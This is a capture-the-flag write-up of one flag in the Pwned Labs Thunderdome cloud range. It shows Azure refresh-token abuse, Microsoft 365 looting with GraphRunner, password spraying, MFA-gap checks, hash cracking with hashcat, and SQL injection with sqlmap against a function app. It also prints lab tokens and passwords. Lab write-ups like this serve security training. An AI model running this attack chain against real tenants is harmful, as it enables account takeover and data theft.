---
description: Writeup for the 3rd flag (An Absent Defense) in the Thunderdome Cyber Range from PwnedLabs
title: Pwned Labs - Thunderdome Flag 3 of 9
date: 2025-05-06 00:00:00 +0200
categories: [Cloud, Pwned Labs, Hacking]
tags: [cloud, hacking, pwnedlabs, thunderdome, azure, tokentacticsV2, msolspray, mfasweep, graphrunner, sqlmap, hashcat]
#show_image_post: true                                   # Change this to true
image: /assets/img/thunderdome.png              # Add infocard image here for post preview image

---


## Recap

Looking back on the previous flag we can summarize our findings below:

### Compromised

We compromised the Haru AWS user and found an AWS EC2 Snapshot we could download and dissect to get more information.

### Azure Tokens and AWS Keys from EC2 Snapshot

Nacer AWS Keys:

```console
aws_access_key_id = AKIATCKANV3QAD7S2*** 
aws_secret_access_key = GqWJEq7oRKCeNy+qbCBD5rh6Ho2V+YaXoPB4Y***
```

Nacer Azure Token:

```console
"credential_type": "RefreshToken",
"secret": "0.Aa4Ai9oiJQHYxECIvxlE6unSN5V3sATbjRpGu-4C-eG_e0arAHM.AgABAAEAAADnfolhJpSnRYB1SVj-Hgd8AgDs_wUA9P80D9whslr76-qn3KXbz92z7PYV09JNRNbzWbqto_PI_UMQGpa_uwjtJl-XugFPi3lAHGXwbhZb7oAW8x-2J7hQUc9mKTypJuPRNc7vK_sLWh5kDa5cs8UFA_iyDxL_DOzb6W_d11tf_zM3O_1KQpDQ2_eZJ3ugWrquMv6k4mCkPhkVB_JBBpvspCQGxiXl7uCzXeSHJwV6sFABrTcH7CSTbdJRLsafoIaUCM7o-H9gk-TDkSwsG9yR1qxY6Zq2EyZukFkeR007Kr3FUz9grWU_Qapu-BNOAwC4pILiRVoRIQo-cnUuiggxzqukO5P7tkMr0GF7WwBOh7igFKiQOG9uQBtigQJ2HY5Vup5bCo3-Zp6w0fZougDv66od94Yvyx3gzyLD6Hkif0OQIRFa67lNiZrFZ2dYVRmIJo6ws3f7iP83GOoqHUSrxqk2SsDzfveRi-sFZepVIUIIqldFQEy5aiQyPIZ7N7FP_pC-plzOG0ORo__SjKDpYd14l-RJN0W309F4YVUkrYgvrDsRGlI5g5_1Ku1b532jUC8VCx1kfilyZHZeZOOFNMN0tw_C6RqXvCag8zoe8pD2FmXpAVm2mldhU9i8_bsbxsfyF8mixf5v7VZ4kDnNpEEKBN5NTVmI8mNwFCMXJqYFtrMonDEugDpspGth96kc3iOYO-W24uX0EjEcQsRwX2TnXw"
```

### Using AWS Keys to Sync S3 Bucket to get flag

We used Nacer's AWS keys to enumerate further and found the `mp-clinical-trial-data` S3 Bucket that we have access to. 
We synced the bucket to obtain the flag and a file ``openemr-5.0.2.tar.gz`` hinting to the use of [OpenEMR](https://https://github.com/openemr/openemr)   


If you would like to see how I managed to obtain the above info, view the post for Flag 2 [here](https://mikecoetzee.github.io/posts/PwnedLabs-Thunderdome-Pulled-From-The-Sky/)

## Enumeration

Using the information we have gathered previously we looked at `OpenEMR` and their Github Repo and we did not find much to pivot on for now.

Let's move to our Azure RefreshToken we extracted from the Snapshot

## Azure Refresh Token Abuse

Now let's use a very well known Token Abuse tool called [TokenTactics](https://github.com/f-bader/TokenTacticsV2) to get an Access Token for further enumeration.

Let's clone the repo with `git clone https://github.com/f-bader/TokenTacticsV2` then cd into the directory. 

```console
┌──(kali㉿kali)-[/opt]
└─$ sudo git clone https://github.com/f-bader/TokenTacticsV2.git
Cloning into 'TokenTacticsV2'...
remote: Enumerating objects: 225, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 225 (delta 5), reused 5 (delta 4), pack-reused 189 (from 1)
Receiving objects: 100% (225/225), 1.68 MiB | 466.00 KiB/s, done.
Resolving deltas: 100% (137/137), done.

┌──(kali㉿kali)-[/opt]
└─$ cd TokenTacticsV2
```

Run Powershell with `pwsh` in Kali Linux and import the module with `Import-Module ./TokenTactics.psm1`

![TokenTacticsV2](/assets/img/TokenTacticsflag3.png)

Now that the module is loaded let's run `Invoke-RefreshToMSGraphToken -domain massive-pharma.com -RefreshToken “RefreshToken”` to get a MS Graph token.



We can not use the Refresh Token from the Snapshot as it has rotated due to being inactive for more than 90 days. 
If you look at the "`StartTime`" of below Snapshot info. It is over the 90 day period so the tokens must have been rotated already. 

```json
{
    "Snapshots": [
        {
            "Description": "Created by CreateImage(i-0d67cb27d5cc12605) for ami-00568b27b974ba617",
            "Encrypted": false,
            "OwnerId": "211125382880",
            "Progress": "100%",
            "SnapshotId": "snap-0c241b0d00d234853",
            "StartTime": "2024-03-08T14:21:24.988000+00:00",
            "State": "completed",
            "VolumeId": "vol-05ada6051c8801cad",
            "VolumeSize": 8,
            "StorageTier": "standard"
        }
    ]
}
```

But wait.. We still have our SSH private key for Nacer to `web-prod`. Let's login again and see if the account is still valid. 

Let's run `az account show` to see if Nacer has an active Azure login on the VM.

![AZAccount](/assets/img/flag3azaccountshow.png)

We get the below info showing that we have a valid login.

```json
{
"environmentName": "AzureCloud",
"homeTenantId": "2522da8b-d801-40c4-88bf-1944eae9d237",
"id": "41b63b94-5bb3-41b2-a2ad-2b411979dc26",
"isDefault": true,
"managedByTenants": [],
"name": "Azure subscription 1",
"state": "Enabled",
"tenantId": "2522da8b-d801-40c4-88bf-1944eae9d237",
"user": {
"name": "nacer@massive-pharma.com",
"type": "user"
}
}
```
Let's get the current `RefreshToken` from the `msal_token_cache.json` file using `cat msal_token_cache.json`.

We get the `RefreshToken` below:

```json
{"Credential_type": "RefreshToken", 
"secret": "1.Aa4Ai9oiJQHYxECIvxlE6unSN5V3sATbjRpGu-4C-eG_e0Y8AXOuAA.AgABAwEAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P-VkaMl1oQ82Ejxc9psLIv2aEJ-8JwbJY7RrSRHo6y2159yahAaTO5bNYhhoqFY67PBURnzJTdXEesDmn6wCzBS5z3pukoRkUxk1rbCdwOSQBiGP3o0zvdhfq_o7wlD0J7D4g6iWWJ5BZ-GGNsYPJWAKJQAZB3dZN4Pj1IWhWsPWNTc-hte-qCZmv4-oKb5HhkqudAzLrbrAMn7RJjdTzjwTPfMwjsZBKRwOS7hcVqWVTT6ZvBSTZo7p-3w-MlzOlSF-DGAx_TjT42ox3q5-Yf0-42uPh0NdC9HRKUfDCq_xOErMCKJkfP65FM5RXStUqiHmcGhtY22dTLkiZi77T6Fzx1BpM5N3nzi22L567pDBWDUvcrpUrFvFMG7kLUH-g8MSO3Mtya2q5f_HLgot1_hzXIrgGl4bx5ejX5DCPg"}
```

Now that we have a valid `RefreshToken` let's run `Invoke-RefreshToMSGraphToken -domain massive-pharma.com -RefreshToken “RefreshToken”` again to get a MS Graph Access token. 

![MSGraphToken](/assets/img/TokenTacticsflag3gettoken.png)

We can see we have permissions that can help us enumerate a few thing such as Entra Users, Teams and Mails. 

User Permissions:

- `https://graph.microsoft.com/User.Read.All`
- `https://graph.microsoft.com/User.ReadBasic.All`
- `https://graph.microsoft.com/User.ReadWrite`
- `https://graph.microsoft.com/Users.Read`

Teams Permissions:

- `https://graph.microsoft.com/TeamMember.ReadWrite.All`
- `https://graph.microsoft.com/TeamsTab.ReadWriteForChat`

Mail Permissions:

- `https://graph.microsoft.com/Mail.ReadWrite`
- `https://graph.microsoft.com/Mail.Send`

## Pillaging 365 Using GraphRunner

Let's grab the Access token with the input `$MSGraphToken.access_token`

![TokenGrab](/assets/img/TTflag3TokenGrab.png)

Now that we have an Access Token let's use another Post Exploitation tool called [Graphrunner](https://github.com/dafthack/GraphRunner) to make querying MS Graph much easier.

Let's clone the repo with `git clone https://github.com/dafthack/GraphRunner` and cd into the repo and run `pwsh` to open the Powershell console. 

Then we import the module `Import-Module .\GraphRunner.ps1` and run the GUI with `firefox GraphRunnerGUI.html`   
Let's parse the token to confirm everything is valid and working. 

![GraphRunner](/assets/img/GraphParseToken.png)

Everything looks good! Let's see what other information we can pillage from 365. 

Users:

We see a list of users we can export for further use. Use the Export function or copy the text to a azureusers.txt file. 

![Users](/assets/img/flag3azureusers.png)

Email:

We see some interesting information on the emails referencing a WebApp/Software called "`Pharsight`" and a possible password for a user "`$MPappdev1`"

![Email](/assets/img/Graphrunnermails.png)

We also see some reference to a AWS/Azure DR Test suggesting a possible DR Environment that is worth noting. 

Teams did not give much more info so let's recap what we have found. 

- A list of Users "`azureusers.txt`"
- A Password "`$MPappdev1`"
- Unknown App "`Pharsight`"
- Possible DR Environment

## Password Spraying 365

Let's use the password we got from the emails and spray it across the user list we pulled from Entra. Maybe we can pivot to another user. 

Let's use [MSOLSpray](https://github.com/dafthack/MSOLSpray) and see if the password matches any of the users we managed to pull from Entra. 

Let's `git clone https://github.com/dafthack/MSOLSpray` and `cd MSOLSPray` then run `pwsh` and import the module with `Import-Module MSOLSpray.ps1`

Now we can spray the password with `Invoke-MSOLSpray -UserList .\azureusers.txt -Password $MPappdev1`

![Spray](/assets/img/Sprayflag3.png)

And we get a match for `yuki@massive-pharma.com` with the password `$MPappdev1`

![Success](/assets/img/sprayflag3success.png)

## MFASweep 

Now before we just login to the account and set off MFA push notifications let's first see if it is protected with MFA using [MFASweep](https://github.com/dafthack/MFASweep).

As usual we `git clone https://github.com/dafthack/MFASweep` and `cd MFASweep`. In a Powershell terminal `pwsh` run `Import-Module MFASweep.ps1`.

Now we can run MFASweep against `yuki@massive-pharma.com` with `Invoke-MFASweep -Username yuki@massive-pharma.com -Password '$MPappdev1'`.

![MFASweep](/assets/img/mfasweepflag3.png)

And we can see that the Graph and Service Management API is accessible without MFA requirement. 

Let's login to the portal and see what we can find. 

## Enumerating as Yuki

We see recent resources that were accessed by Yuki below:

![Portal](/assets/img/yukiportal.png)

Here we have additional Attack Surfaces we can enumerate:

- Storage: `mpprod`   
- Function App: `pharsight-dev` (Remember the email referencing this app)

### Storage account

Let's look into the Storage Account. We find "`$Logs`" and "`portal-storage`" containers. 

![Storage](/assets/img/flag3container.png)

Looking inside `portal-storage` we find a script `export-users.sh`

![Container](/assets/img/flag3portalblob.png)

Let's look at the script contents:

```console
#!/bin/bash

DB_NAME="portal"
TABLE_NAME="users"
EXPORT_FILE="users_export_$(date +%Y%m%d).csv"
CONTAINER_NAME="portal-storage"
STORAGE_ACCOUNT="mpprod"
RESOURCE_GROUP="MP-PROD1"
CONNECTION_STRING=$(az storage account show-connection-string --name $STORAGE_ACCOUNT --resource-group $RESOURCE_GROUP --query connectionString --output tsv)

PGPASSWORD=<password> pg_dump -h your_host -U nacer -d $DB_NAME -t $TABLE_NAME --csv > $EXPORT_FILE

if [ ! -f $EXPORT_FILE ]; then
echo "Export failed."
exit 1
fi

az storage blob upload --connection-string $CONNECTION_STRING --container-name $CONTAINER_NAME --file $EXPORT_FILE --name $EXPORT_FILE

rm $EXPORT_FILE
```

The script seems to export the `users` table from a DB named "`portal`" to the `portal-storage` container, although we do not see any exports as yet.

Let's look back into the portal, where we see there is a slider for show deleted blobs. Switching this on we see the exported `users` table into the file `users_export_20240202.csv`

![Deleted](/assets/img/Deletedversion.png)

Let's download `users_export_20240202.csv` and see what information we can gather from the file.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ cat users_export_20240202.csv 
full_name,email_address,username,hashed_password
Alex Johnson,alex.johnson83@netmail.com,alexj,fe5933139f04bd0ceffe3a1baecd6d58dcc479474c064f87b5126862b26e3569
Bailey Turner,bailey.t1990@quickmail.com,baileyt,43563eb5af82b1ae2977c8d327b08eaeea6a8e665ef4820dddf1da9ea2b7fe67
Chris Daniels,chris_daniels@inboxhub.com,chrisd,d89dc49cf16a1e86e98fbd2b880908540c9439e06aff5b18da06516b619d103e
Dana Knight,d.knight@digitalmail.com,danak,da7b91d1a5c322b550626b97b0b7a84653eb26b0e44a347fac0dd77ca8a80b6c
Erin Lee,e.lee88@mailer.com,erinl,c3f366b4f4835d2ec4a7c07b2f8b8c1e0a33c5dca59e82d102cd6bfcfbb34ac4
Frankie Gomez,fgomez@connecto.com,frankieg,993834322583e0d7a8a96a7aa56e8375498bb286b4adf1650f96be855caca616
George Hayes,ghayes@emailexample.com,georgeh,9bbc3f0356dcf03fe9be741df68ddd7d633e80db55d07d9c8424e2c0dc7ccd20
Harper Brooks,harperb@myemail.net,harperb,52c5186e5600219dd30656d5e75aed8d70150a4ea73639adbc9b5d21f4736b05
Isla Fisher,isla_fisher@post.com,islaf,084e3b46a253223f4aa8f7060183365b3b6bf80390c52e853a516ccd9d586682
Jordan Smith,jsmith101@onlinemail.com,jordans,da1c065c0f4b491cccdb12e5d6a37e9aedcd244531538bde2f05a4807a546a06
Kerry Brown,kerry.b@virtualmail.com,kerryb,4f952f5fc006f7fc04f5805b97e6f7ba6de3a19f9059d5ffbd7f7c8ca0cf8b40
Logan Parker,l.parker@cloudmailservice.com,loganp,057c33787dd19e97736575c0ee51639120952a73f8ba1853964db17fcdd44a5a
Morgan Riley,m.riley@internetmail.com,morganr,1d76e4bd31d6600fbe0e6f3d629d0d8eda4e61c7c21571a4ab14dad84d8c2637
Noah Gray,noah.gray2000@fastmail.com,noahg,55757c5919047ade3c3543900fc358b92c5dec8a2f65c7b132e83ca120aa5290
Olivia Martinez,oliviam@correspondence.com,oliviam,109861f9b837667225658176214aee1e272541dd5763498b17b768dfc4575050
Test Acc,testacc@massive-pharma.com,testacc,75587e5e2c48b2be2ff1db3f279bf106943fbc0e1e1e7ed9228c5d8741302846
Pat Kim,patkim@contactzone.net,patk,aad322f920a0f8402d9238e395880c7c33b868e03604db2cd9fe8e1a75d3b09d
Quinn Johnson,quinn.j@webconnect.com,quinnj,febdd5581ff3869d9acacbdf9950c96fd88a48a30c64a4fae727ab18f087390b
Ryan Cooper,ryan.coop@easymail.com,ryanc,6346a54933abdd01da7511f53930aa94b253908673000bdf7097c17950759eba
Sam Lee,samlee@reliablemail.com,saml,4273539b15b97dbac71404e6c353498d5d21429472a31180b7258d6d2e5385e5
Taylor Morgan,t.morgan@modernmail.com,taylorm,3faa16b8bd9ba4e96652c34dd2fb35e20c3842891b0317c5151e707e298fd7cf

```

Looking into the file we have multiple users with their hashed passwords! Let's see what hash is being used and if we can possibly crack any of these hashed passwords.   

### Password Cracking

Let's use `hash-identifier` built into kali to determine which hash was used on these passwords. 

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ hash-identifier fe5933139f04bd0ceffe3a1baecd6d58dcc479474c064f87b5126862b26e3569
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------

```

From the results we can see that the Hash is most likely `SHA256`. 
Before we go ahead and crack these hashes let's extract only the hashes to a list to feed into `hashcat`   

We do this by running `awk -F, '{print $4}' users_export_20240202.csv > hashes.txt`

- `-F` Field Separator
- `'{print $4}'` Prints the 4th field (Hashes)
- `>` will send the output to a file hashes.txt

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ awk -F, '{print $4}' users_export_20240202.csv > hashes.txt
hashed_password
fe5933139f04bd0ceffe3a1baecd6d58dcc479474c064f87b5126862b26e3569
43563eb5af82b1ae2977c8d327b08eaeea6a8e665ef4820dddf1da9ea2b7fe67
d89dc49cf16a1e86e98fbd2b880908540c9439e06aff5b18da06516b619d103e
da7b91d1a5c322b550626b97b0b7a84653eb26b0e44a347fac0dd77ca8a80b6c
c3f366b4f4835d2ec4a7c07b2f8b8c1e0a33c5dca59e82d102cd6bfcfbb34ac4
993834322583e0d7a8a96a7aa56e8375498bb286b4adf1650f96be855caca616
9bbc3f0356dcf03fe9be741df68ddd7d633e80db55d07d9c8424e2c0dc7ccd20
52c5186e5600219dd30656d5e75aed8d70150a4ea73639adbc9b5d21f4736b05
084e3b46a253223f4aa8f7060183365b3b6bf80390c52e853a516ccd9d586682
da1c065c0f4b491cccdb12e5d6a37e9aedcd244531538bde2f05a4807a546a06
4f952f5fc006f7fc04f5805b97e6f7ba6de3a19f9059d5ffbd7f7c8ca0cf8b40
057c33787dd19e97736575c0ee51639120952a73f8ba1853964db17fcdd44a5a
1d76e4bd31d6600fbe0e6f3d629d0d8eda4e61c7c21571a4ab14dad84d8c2637
55757c5919047ade3c3543900fc358b92c5dec8a2f65c7b132e83ca120aa5290
109861f9b837667225658176214aee1e272541dd5763498b17b768dfc4575050
75587e5e2c48b2be2ff1db3f279bf106943fbc0e1e1e7ed9228c5d8741302846
aad322f920a0f8402d9238e395880c7c33b868e03604db2cd9fe8e1a75d3b09d
febdd5581ff3869d9acacbdf9950c96fd88a48a30c64a4fae727ab18f087390b
6346a54933abdd01da7511f53930aa94b253908673000bdf7097c17950759eba
4273539b15b97dbac71404e6c353498d5d21429472a31180b7258d6d2e5385e5
3faa16b8bd9ba4e96652c34dd2fb35e20c3842891b0317c5151e707e298fd7cf

```

Let's use `hashcat` on the hashes with the mode for `SHA256`

We can also let hashcat determine the correct mode for cracking by running `hashcat hashes.txt /usr/share/wordlists/rockyou.txt` without specifying the mode.   

`hashcat` will then give you the possible modes as well. 

```console
The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated

```

Now we can run `hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt`

```console
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

75587e5e2c48b2be2ff1db3f279bf106943fbc0e1e1e7ed9228c5d8741302846:biotch#1
```

And we have cracked one of the hashes! Let's see who the hash belongs to with `cat users_export_20240202.csv| grep 75587e5e2c48b2be2ff1db3f279bf106943fbc0e1e1e7ed9228c5d8741302846`

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ cat users_export_20240202.csv| grep 75587e5e2c48b2be2ff1db3f279bf106943fbc0e1e1e7ed9228c5d8741302846
Test Acc,testacc@massive-pharma.com,testacc,75587e5e2c48b2be2ff1db3f279bf106943fbc0e1e1e7ed9228c5d8741302846

```

We have the password for `testacc@massive-pharma.com` which is "`biotch#1`"

Let's note the account details for further pivoting once our enumeration is finished as Yuki. 

### Function App

Let's look into the Function App `pharsight-dev`

![App](/assets/img/functionapp.png)

Here we can see more info for the function app: 

- Domain: `pharsight-dev.azurewebsites.net`
- OS: Windows

Looking at the function tab we see a `HttpPharSightTrigger01` function.

![Function](/assets/img/pharsightfunction.png)

Trying to look at the code we see Yuki does not have the required permissions..

![Permissions](/assets/img/functioncodenoperm.png)

Let's query the url directly and see what we get.

![Query](/assets/img/queryurl.png)

It is looking for some input variable `trialname` in JSON format. 

Let's proxy the request to [BurpSuite](https://portswigger.net/burp/communitydownload) and see what we have to work with. 

![Burp](/assets/img/burprequestflag3.png)

Let's send the request to Repeater and change the request to `POST` seeing as it is an API and wants input, then add the example trialname it gave.

![BurpTrialname](/assets/img/burptrialname.png)

And we get all the info for the trialname "CardioPhase II"

Let's test the input for SQL Injection, seeing as we are working with DB's and inputs into the Function App.

![SQLi](/assets/img/burpsqli.png)

And we have SQL Injection dumping all trialnames information. Exploiting this will be tedious in BurpSuite so let's save the request to `pharsightsqli.req` and use [SQLMap](https://github.com/sqlmapproject/sqlmap) to do the heavy lifting for us. Work smarter, not harder `:)`

## SQLMap

Let's run the command to see which DB's are available.

```console
sqlmap -r pharsightsqli.req -p "trialname" --skip-urlencode --dbs
```

- `-r` for our request file
- `-p` for our vulnerable parameter
- `--skip-urlencode` to skip URL Encoding 
- `--dbs` to list Databases

We see 3 DB's listed. 

- `master`
- `pharsight-srv-1`
- `tempdb`

![SQLMap](/assets/img/sqlmapdbsflag3.png)

Let's focus on the non standard DB `pharsight-srv-1` and list the tables in this DB.

```console
sqlmap -r pharsightsqli.req -p “trialname” —skip-urlencode -D pharsight-srv-1 —tables
```

- `-D` to select the DB
- `--tables` to dump the tables

![Table](/assets/img/pharsighttable.png)

Here we see 3 tables:

- `Participants`
- `appusers`
- `sys.database_firewall_rules`

Looking into the tables, `appusers` stands out as `Participants` we can already get from the Functions App itself. 

Let's dump the `appusers` table. 

```console
sqlmap -r pharsightsqli.req -p “trialname” —skip-urlencode -D pharsight-srv-1 -T appusers —dump
```
- `-T` to select the table
- `--dump` to dump the selected table from the DB

And we have Flag 3!! We also have a password for `Nina@massive-pharma.com` which we can note for our future flags. 

```console
Database: pharsight-srv-1
Table: appusers
[2 entries]
+---------+----------------------------------+----------+
| id      | password                         | username |
+---------+----------------------------------+----------+
| <blank> | wcy4^UV%#^hv35C@^!               | nina     |
| <blank> | 4759ada207c520c956abfbfc530c**** | flag     |
+---------+----------------------------------+----------+
```

And that concludes the "An Absent Defense" flag from the Thunderdome Cyber Range hosted by the great people at [Pwned Labs](https://pwnedlabs.io/).